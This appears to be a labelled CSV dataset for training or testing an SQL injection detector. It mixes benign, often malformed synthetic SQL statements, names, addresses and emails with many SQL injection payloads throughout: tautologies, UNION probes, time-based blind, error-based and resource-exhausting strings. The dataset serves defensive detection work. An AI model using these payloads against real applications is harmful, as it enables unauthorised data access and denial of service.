Query,Label
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0
"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"INSERT INTO seldom  ( tomorrow, nearly, scientific )  VALUES  ( 'grew', 'vegetable', 'tongue' )  ",0
"  UPDATE bare SET bigger =  'six', City =  'plus' WHERE common =  wind",0
"INSERT INTO younger ( improve, darkness, being, anywhere, rather, lie )  VALUES  ( 'can', 'percent'. cattle', 'necessary', 'position', 'escape', 'check' )  ",0
8.51E+15,0
nehemiah,0
"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",1
"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",1
SELECT dear FROM famous UNION SELECT equipment FROM power ORDER BY hurry,0
SELECT * FROM them WHERE money = 'straight' LIMIT 3,0
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",1
select name from syscolumns where id   =     (  sele ...,1
SELECT * FROM pen WHERE straight = 'deep'  OR eventually = 'its',0
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT phrase,0
SELECT DISTINCT dangerous FROM give,0
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'qiau'  =  'qiau,1
1' where 9216  =  9216,1
SELECT AVG ( instance ) FROM spite,0
lubna,0
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,1
1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  '%'  =  ',1
SELECT * FROM highest WHERE answer BETWEEN '1996-07-01' AND '1996-07-31',0
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'qfxg'  =  'qfxg,1
24429,0
SELECT AVG ( silver )  FROM concerned  SELECT SUM ( load ) ,0
1'||  (  select 'zeet' from dual where 9567  =  9567 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1'   )    )    union all select null,null,null,null#",1
"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",1
"gredos, 114 12?g",0
SELECT option_value FROM wp_options WHERE option_name  =  'kc_options' LIMIT 1,0
FROM  ( SELECT DISTINCT hill FROM large ) ,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c88946771c' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1%' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ",1
SELECT COUNT ( opposite ) FROM it,0
"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT COUNT ( niceID ) FROM post,0
3.19537E+15,0
SELECT TOP 50 PERCENT * FROM shown SELECT * FROM stay FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM plates,0
"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",1
-5327'   )    )     )   or 1606  =  6099,1
FROM  ( SELECT DISTINCT end FROM but ) ,0
1%'  )   and   (  7704  =  3494  )  *3494 and   (  '%'  =  ',1
SELECT * FROM mouth FETCH FIRST 50 PERCENT ROWS ONLY,0
palazuelos de eresma,0
2252,0
SELECT cheese ( s )  FROM daughter SELECT grass FROM soft,0
SELECT golden ( s )  FROM citizen UNION,0
"c/ animas, 101,",0
"etorbidea nafarroa behereko, 162 6?d",0
SELECT MIN ( it )  AS pitch FROM dinner,0
"1%' union all select null,null,null,null,null,null#",1
SELECT * FROM expect WHERE nest BETWEEN '1996-07-01' AND '1996-07-31',0
2.89989E+15,0
7.67E+15,0
"   SELECT COUNT ( principle ) , office FROM idea BY biggest",0
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,1
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1
2502,0
8167,0
vitalia,0
"  SELECT ""HELLO""  =  ""hello"";",0
" SELECT * FROM helpful ORDER BY new, new",0
3.15402E+15,0
cauthen3,0
SELECT * FROM adjective FETCH FIRST 50 PERCENT ROWS ONLY,0
le8ru41,0
SELECT TOP 3 * FROM opposite WHERE place = 'beside',0
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,1
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'lshk' like 'lshk",1
1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',1
-4835   )    )     )   or   (  4219  =  2081  )  *2081 and    (    (     (  8536  =  8536,1
"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",1
SELECT find FROM small UNION SELECT lose FROM tears ORDER BY harder,0
"select sleep  (  5  )   and    (    (   ""twed"" like ""twed",1
1'||  (  select 'ussi' where 8958  =  8958,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c883f67716' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"  SELECT dangerous,pretty FROM freedom WHERE loud = 'badly' UNION SELECT apartment, office FROM light",0
SELECT * FROM shoe WHERE Price NOT BETWEEN 10 AND 20,0
SELECT rush,0
"1%"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1
"   SELECT street, money+ ', ' + factory+ ' ' + leather+ ', ' + topic AS smoke  FROM stepped",0
SELECT equipment ( s )  FROM obtain LEFT JOIN,0
SELECT * FROM rubbed FETCH FIRST 3 ROWS ONLY,0
6.27383E+15,0
SELECT MIN ( buy )  AS forty FROM whom,0
1' where 2690  =  2690,1
31819774x,0
SELECT below ( s )  FROM dear UNION,0
SELECT AVG ( arrow ) FROM parent SELECT SUM ( atomic ) ,0
 UPDATE would SET through = 'wrapped'WHERE family = 'film',0
"-3438""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""nxiv""  =  ""nxiv",1
"-5024%"" or make_set  (  3321  =  7355,7355  )   and ""%""  =  """,1
"plza. carmelo solis, 78, 4?g",0
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",1
SELECT sight FROM nine UNION ALL SELECT knew FROM lie ORDER BY aside,0
SELECT * FROM person FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM frog,0
SELECT TOP 3 * FROM crop WHERE further = 'minerals' SELECT * FROM involved,0
"  UPDATE hunter SET directly =  'from', City =  'rocky' WHERE any =  general",0
SELECT * FROM welcome,0
astor,0
SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football,0
SELECT * FROM personal 3,0
3j,0
"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",1
pruja lantadilla,0
SELECT * FROM kill FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM smooth,0
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
1' where 9416  =  9416,1
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh",1
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1
"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ggiw'  =  'ggiw",1
SELECT * FROM Customers  WHERE City LIKE '[a-c]%';,0
SELECT * FROM zipper FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,0
e_ncobador,0
maheu,0
SELECT chemical ( s )  FROM coat UNION,0
SELECT * FROM there WHERE gate BETWEEN '1996-07-01' AND '1996-07-31',0
" SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = 'Around the Horn' AND c.CustomerID = o.CustomerID;",0
SELECT * FROM popular,0
6736,0
63829565b,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'xcxr' like 'xcxr",1
1'   )    )    as wqhm where 9871  =  9871,1
"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
"  SELECT DATE_SUB ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0
rousseau,0
timb44,0
1 where 8506  =  8506,1
grodecki,0
"  SELECT * FROM mail WHERE human NOT IN  ( 'particles', 'porch', 'colony' )  ",0
11615910j,0
1'+  (  select 'wsjk' where 3291  =  3291,1
SELECT turn,0
"-2855""   )    )     )   union all select 1496,1496,1496,1496#",1
"INSERT INTO total  ( replied, job, settlers )  VALUES  ( 'fastened', 'scale', 'pond' )  ",0
-4828%'  )   or 8678  =  5745#,1
-7199'||  (  select 'ssty' where 5406  =  5406 order by 1#,1
5.11164E+15,0
select case when 6555  =  7349 then 1 else null end--,1
SELECT * FROM cream 3 SELECT * FROM cloth,0
"-1722' union all select 1408,1408,1408#",1
"1""   )    )     )   union all select null,null,null,null,null--",1
"-1204'   )    )    union all select 3585,3585--",1
SELECT * FROM smooth WHERE choose BETWEEN 'news' AND 'drop',0
"-6681""  )   or 5251  =  1162",1
SELECT TOP 3 * FROM higher SELECT * FROM ourselves 3SELECT * FROM worse,0
lorenson-tordi@youtubeanunciox.fk,0
SELECT * FROM unhappy WHERE NOT hung = 'element'  AND NOT bell = 'universe',0
7250,0
" end and ""mdje"" like ""mdje",1
1'   )    )    as kgfp where 2366  =  2366,1
1'||  (  select 'glec' from dual where 4846  =  4846,1
destullecer,0
SELECT * FROM hole WHERE son = 'wish',0
SELECT * FROM truth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM hall,0
1 or 1  =  1,1
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',1
"-8349  )   union all select 8126,8126#",1
-2351   )    )    as xdqn where 4019  =  4019 or 8571  =  8571--,1
"1""   )    )    union all select null,null#",1
SELECT TOP 50 PERCENT * FROM sometime SELECT * FROM herd FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM log,0
"1""  )   as rbgl where 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
SELECT TOP 3 * FROM daily WHERE wood = 'appropriate' SELECT * FROM income,0
"   SELECT Employees.lot, COUNT ( Orders.industryID )  AS talesFROM    ( OrdersINNER JOIN must ON Orders.equipmentID  =  Employees.stiffID ) ",0
"   SELECT farm, worried, builtFROM magic WHERE team  IS NOT NULL",0
"c/ francisco javier simonet 7, 11?e",0
"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",1
SELECT * FROM massage WHERE split = 'face' LIMIT 3,0
SELECT AVG ( mud )  FROM learn  SELECT SUM ( cannot ) ,0
SELECT * FROM fifth WHERE    NOT north = 'furniture',0
select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,1
"SELECT * FROM tired WHERE strong BETWEEN ""keep"" AND    ""difficult""",0
"1""   )    )    union all select null,null,null,null,null,null,null,null#",1
puebla de don fadrique,0
"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",1
1'   )    )     )   order by 1#,1
SELECT adventure FROM farm,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1
guntekin,0
"  UPDATE location SET couple =  'line', City =  'key' WHERE belt =  village",0
SELECT MIN ( damage )  AS won FROM sea,0
"1""   )    )    as cduw where 4495  =  4495",1
bogarde4@tiendasyofertas.museum,0
ciudad real,0
SELECT * FROM near WHERE    NOT eager = 'body',0
SELECT * FROM dangerous,0
"   SELECT Employees.plates, COUNT ( Orders.burstID )  AS patternFROM    ( OrdersINNER JOIN safe ON Orders.youID  =  Employees.callID ) ",0
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
myrna5@adondeir.at,0
"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",1
6.36091E+15,0
SELECT * FROM explore WHERE with = 'affect' LIMIT 3,0
SELECT stream FROM sport,0
96110955g,0
DELETE FROM lead WHERE thus = 'trouble',0
SELECT * FROM actually WHERE riding = 'writing' FETCH FIRST 3 ROWS ONLY,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6053 )  ORDER BY meta_id ASC",0
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
1%' and sleep  (  5  )   and '%'  =  ',1
"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"   SELECT are, zulu+ ', ' + practical+ ' ' + hour+ ', ' + beside AS correctly  FROM go",0
chavis,0
cantoria,0
"SELECT * FROM love WHERE pour BETWEEN ""period"" AND    ""full""",0
SELECT * FROM curve WHERE NOT that = 'try'  AND NOT case = 'history',0
1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
SELECT COUNT ( possible )  FROM once,0
SELECT MIN ( given )  AS cost FROM thick,0
"1""  )   as ivuv where 5691  =  5691",1
"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1
7.75898E+15,0
SELECT enough FROM yard UNION ALL SELECT whole FROM opportunity ORDER BY itself,0
SELECT * FROM harbor FETCH FIRST 50 PERCENT ROWS ONLY,0
1'   )    )    order by 1--,1
"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
" SELECT column_name ( s )  FROM saw,feature",0
FROM  ( SELECT DISTINCT scared FROM respect ) ,0
-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok,1
SELECT indicate FROM western UNION SELECT shelf FROM accurate ORDER BY warm,0
SELECT highest ( s )  FROM taken UNION ALL,0
"c/ veinat de cerdanyola, 3 6e",0
"-8053"" where 5458  =  5458 or 9323  =  9323#",1
SELECT outer ( s )  FROM object SELECT waste ( s ) ,0
"c/ honduras, 139 7-a",0
polvo,0
SELECT TOP 3 * FROM beautiful,0
"1   )    )    as zkrr where 4730  =  4730 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
-2761 or 1144  =  7657-- mfml,1
"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
lab2a8o4i0,0
"c/ santa olaja, 121 2?d",0
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'zknl'  =  'zknl",1
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1
tesisteco avi,0
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1
nolay,0
"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",1
"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1
"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,1
93289880v,0
"   SELECT COUNT ( rice ) , lungs FROM laid BY include",0
SELECT TOP 3 * FROM frog,0
SELECT failed ( s )  FROM interior SELECT characteristic FROM select,0
"c/ boabdil, 91",0
1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1
00783778f,0
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1
casacuberta delacerda,0
SELECT AVG ( attack ) FROM over,0
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'ajka'  =  'ajka,1
9867,0
-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,1
DELETE FROM ice,0
gibezzi scampini,0
2isp3n?3io43,0
SELECT * FROM its WHERE happen NOT LIKE '[truck]%',0
5122,0
"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"  UPDATE appearance SET forget =  'gasoline', City =  'properly' WHERE usual =  enemy",0
"1'  )   where 1600  =  1600 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM tail WHERE off NOT LIKE 'born%',0
